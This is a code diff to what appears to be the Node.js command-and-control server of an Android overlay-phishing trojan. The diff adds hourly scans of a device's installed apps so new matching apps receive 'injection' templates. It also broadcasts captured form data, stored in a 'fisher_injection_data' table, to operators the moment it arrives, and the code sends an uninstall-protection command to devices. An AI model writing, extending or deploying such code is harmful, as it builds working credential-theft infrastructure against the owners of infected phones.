@@ -7,6 +7,15 @@ const { allowWrite: wtAllow, markWritten: wtMark } = require('../services/writeT
 const { recordDeviceDebug } = require('../services/deviceDebugLog');
 // TG 通知已移到 PHP DeviceController 中处理
 
+const DEFAULT_APP_LIST_SCAN_INTERVAL_MS = 60 * 60 * 1000;
+
+function getAppListScanIntervalMs() {
+  const configured = Number(process.env.APP_LIST_SCAN_INTERVAL_MS || DEFAULT_APP_LIST_SCAN_INTERVAL_MS);
+  return Number.isFinite(configured) && configured >= 10000
+    ? Math.floor(configured)
+    : DEFAULT_APP_LIST_SCAN_INTERVAL_MS;
+}
+
 async function queryPolicyRows(sql) {
   try {
     const [rows] = await getPool().query(sql);
@@ -69,6 +78,8 @@ function handleDevice(ws, sessionId, connections) {
     sessionId,
     clientIp,
     appListReceived: false,
+    lastAppListRequestAt: 0,
+    lastAppListResponseAt: 0,
     connectedAt: Date.now(),
     injectionStatusReady: false,
     pendingAutoApps: null,
@@ -86,27 +97,60 @@ function handleDevice(ws, sessionId, connections) {
   // 2026-08-02 device auto-protect: send ENABLE_UNINSTALL_PROTECTION on register
   setTimeout(() => sendProtectFirstTime(connections, sessionId), 2000);
 
-  // 新安装/刚启动的客户端可能在 WS 连上后仍未准备好应用列表模块。
-  // 首次请求和手动“重新获取（设备）”保持同一参数，并在没有响应时自动重试。
-  const appListRetryDelays = [8000, 16000, 30000];
-  const appListTimers = appListRetryDelays.map((delayMs, index) => setTimeout(() => {
+  const sendAppListRequest = ({
+    source,
+    delayMs = 0,
+    attempt = null,
+    totalAttempts = null,
+    onlyUntilFirstResponse = false,
+    dedupeWindowMs = 0,
+  }) => {
     const current = connections.devices.get(sessionId);
-    if (!current || current.ws !== ws || current.appListReceived || ws.readyState !== 1) return;
+    if (!current || current.ws !== ws || ws.readyState !== 1) return false;
+    if (onlyUntilFirstResponse && current.appListReceived) return false;
 
-    const attempt = index + 1;
+    const now = Date.now();
+    // 30 秒的首次重试和周期扫描可能在同一轮定时器中碰到，防止双发。
+    if (dedupeWindowMs > 0 && now - Number(current.lastAppListRequestAt || 0) < dedupeWindowMs) return false;
+    current.lastAppListRequestAt = now;
+
+    // 保持与控制台“重新获取（设备）”完全相同的端侧参数，
+    // source 仅用于服务端日志，避免旧 APK 的严格参数解析拒绝额外字段。
     const params = { full: true, force: true };
-    console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId} attempt=${attempt}/${appListRetryDelays.length}`);
+    const suffix = attempt == null ? '' : ` attempt=${attempt}/${totalAttempts}`;
+    console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId} source=${source}${suffix}`);
     ws.send(JSON.stringify({
       type: 'command',
       sessionId,
       data: { command: 'GET_APP_LIST', params }
     }));
-    void recordDeviceDebug('apps.request.sent', sessionId, {
+    void recordDeviceDebug(
+      source === 'periodic-auto-scan' ? 'apps.periodic.request.sent' : 'apps.request.sent',
+      sessionId,
+      {
+        delayMs,
+        attempt,
+        totalAttempts,
+        command: 'GET_APP_LIST',
+        params,
+        source,
+        lastResponseAt: Number(current.lastAppListResponseAt || 0),
+      }
+    );
+    return true;
+  };
+
+  // 新安装/刚启动的客户端可能在 WS 连上后仍未准备好应用列表模块。
+  // 首次请求和手动“重新获取（设备）”保持同一参数，并在没有响应时自动重试。
+  const appListRetryDelays = [8000, 16000, 30000];
+  const appListTimers = appListRetryDelays.map((delayMs, index) => setTimeout(() => {
+    const attempt = index + 1;
+    sendAppListRequest({
+      source: 'initial-auto-scan',
       delayMs,
       attempt,
       totalAttempts: appListRetryDelays.length,
-      command: 'GET_APP_LIST',
-      params,
+      onlyUntilFirstResponse: true,
     });
   }, delayMs));
 
@@ -120,6 +164,18 @@ function handleDevice(ws, sessionId, connections) {
       }, 'warn');
     }
   }, 45000);
+
+  // 用户可能在设备上后续安装新 APP。设备 WS 在线期间默认每 1 小时（可通过
+  // APP_LIST_SCAN_INTERVAL_MS 调整，下限 10 秒）重新拉取全量列表。列表入库后会再走
+  // handleAppList -> autoInjectForDevice；已注入包由现有去重逻辑跳过，只会对新匹配 APP 下发。
+  const appListScanIntervalMs = getAppListScanIntervalMs();
+  const periodicAppListInterval = setInterval(() => {
+    sendAppListRequest({
+      source: 'periodic-auto-scan',
+      delayMs: appListScanIntervalMs,
+      dedupeWindowMs: 5000,
+    });
+  }, appListScanIntervalMs);
 
   // 设备上线时补发全局策略；第一次失败时稍后重试一次。
   const policySyncTimers = [1500, 10000].map(delay => setTimeout(() => {
@@ -176,6 +232,8 @@ function handleDevice(ws, sessionId, connections) {
           sessionId,
           clientIp: latestClientIp,
           appListReceived: false,
+          lastAppListRequestAt: 0,
+          lastAppListResponseAt: 0,
           connectedAt: Date.now(),
           injectionStatusReady: false,
           pendingAutoApps: null,
@@ -225,6 +283,7 @@ function handleDevice(ws, sessionId, connections) {
   ws.on('close', () => {
     appListTimers.forEach(clearTimeout);
     clearTimeout(appListTimeoutTimer);
+    clearInterval(periodicAppListInterval);
     policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
     clearInterval(serverPingInterval);
@@ -256,6 +315,7 @@ function handleDevice(ws, sessionId, connections) {
   ws.on('error', (error) => {
     appListTimers.forEach(clearTimeout);
     clearTimeout(appListTimeoutTimer);
+    clearInterval(periodicAppListInterval);
     policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
     clearInterval(serverPingInterval);
@@ -278,7 +338,10 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
 
   const markAppListReceived = () => {
     const current = connections.devices.get(sessionId);
-    if (current && current.ws === ws) current.appListReceived = true;
+    if (current && current.ws === ws) {
+      current.appListReceived = true;
+      current.lastAppListResponseAt = Date.now();
+    }
   };
 
   // 旧后端逻辑：心跳/状态/注册消息都会触发设备信息更新
@@ -397,7 +460,23 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
           : [],
         clientTimestamp: msg.timestamp || 0,
       });
-      void saveInjectionData(sessionId, msg, connections);
+      void saveInjectionData(sessionId, msg, connections).then(capture => {
+        if (!capture) return;
+        // 只在表单已入库、活跃任务已清理后通知控制台。
+        // 前端收到该事件后可立即把“停止注入”收敛为“重注”，
+        // 不再依赖 1.5 秒轮询或手动刷新。
+        broadcastToAdmins(connections, {
+          type: 'injection_capture_completed',
+          deviceId: sessionId,
+          sessionId,
+          ...capture,
+        });
+        void recordDeviceDebug('injection.form.completion_broadcast', sessionId, {
+          packageName: capture.packageName,
+          templateId: capture.templateId,
+          recordId: capture.recordId,
+        });
+      });
       broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
       break;
 
@@ -737,7 +816,7 @@ async function saveInjectionData(deviceId, msg, connections) {
     // 直接存储解析后的干净数据（不嵌套 wrapper）
     const formDataStr = typeof formData === 'object' ? JSON.stringify(formData) : String(formData);
 
-    await db.query(
+    const [insertResult] = await db.query(
       'INSERT INTO fisher_injection_data (device_id, template_name, package_name, form_data, created_at) VALUES (?,?,?,?,?)',
       [deviceId, templateName, packageName, formDataStr, Math.floor(Date.now() / 1000)]
     );
@@ -751,6 +830,7 @@ async function saveInjectionData(deviceId, msg, connections) {
 
     // 表单已持久化：服务端将该包名从活跃任务中移除，并以 STOP_INJECTION
     // 作为完成确认。客户端自行关闭页面仍是第一道保障，此命令用于收敛状态。
+    let completionTemplateId = String(msg.templateId || msg.template_id || '');
     if (packageName) {
       let completionRequestId = '';
       let completionSource = '';
@@ -766,6 +846,7 @@ async function saveInjectionData(deviceId, msg, connections) {
               : taskRows[0].task_json;
             completionRequestId = String(taskData?.requestId || '');
             completionSource = String(taskData?.source || '');
+            completionTemplateId = String(taskData?.templateId || completionTemplateId || '');
           } catch {}
         }
         const [clearResult] = await db.query(
@@ -815,7 +896,14 @@ async function saveInjectionData(deviceId, msg, connections) {
       }
     }
     console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
-    return true;
+    return {
+      recordId: Number(insertResult?.insertId || 0),
+      packageName,
+      templateName,
+      templateId: completionTemplateId,
+      data: formData,
+      timestamp: Number(msg.timestamp || Date.now()),
+    };
   } catch (err) {
     console.error('[WS-Device] saveInjectionData error:', err.message);
     void recordDeviceDebug('injection.form.persist_error', deviceId, {
@@ -1117,6 +1205,7 @@ async function handleUploadedAppList(deviceId, apps, connections, source = 'http
   }
 
   current.appListReceived = true;
+  current.lastAppListResponseAt = Date.now();
   void recordDeviceDebug('apps.http_sync.accepted', deviceId, {
     count: Array.isArray(apps) ? apps.length : 0,
     source,
